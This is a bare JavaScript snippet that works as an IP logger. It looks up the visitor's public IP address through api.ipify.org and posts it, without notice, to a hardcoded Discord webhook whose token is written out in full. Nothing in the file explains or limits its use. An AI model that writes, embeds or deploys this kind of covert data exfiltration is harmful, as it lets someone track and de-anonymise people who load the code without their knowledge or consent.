var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function (response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1185689288143282246/_qKZvdzR1ZJVQd6zhfygBjqcmWQ4l4s9xH_PeZiFyje9Pa50iBwAxqEX__q9zSgyYB-_';
    var message = {
        content : 'IP' + ip
    };

    fetch(webhook, {
        method : 'POST',
        headers : {
           'Content-Type' : 'application/json'
    },
    body: JSON.stringify(message)
    });
});
